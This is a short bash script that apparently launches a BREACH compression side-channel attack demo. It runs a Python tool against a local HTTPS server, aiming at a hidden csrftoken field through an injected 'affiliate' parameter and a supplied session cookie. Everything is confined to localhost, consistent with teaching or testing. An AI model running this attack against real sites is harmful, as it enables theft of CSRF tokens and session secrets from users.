#!/bin/bash

export PYTHONPATH=.

./scripts/ssl-demos.py -u 'https://127.0.0.1:2001?affiliate={DATA}' -p 2001 -i 127.0.0.1 -b 'SESSION=0372e249-7932-41ba-8dbb-6e79e991c8e7' -P 'input type="hidden" name="csrftoken" value="' Breach -t 9f0fea5a00946a9a4c606178d85a6464018bc140 --bright -I lo
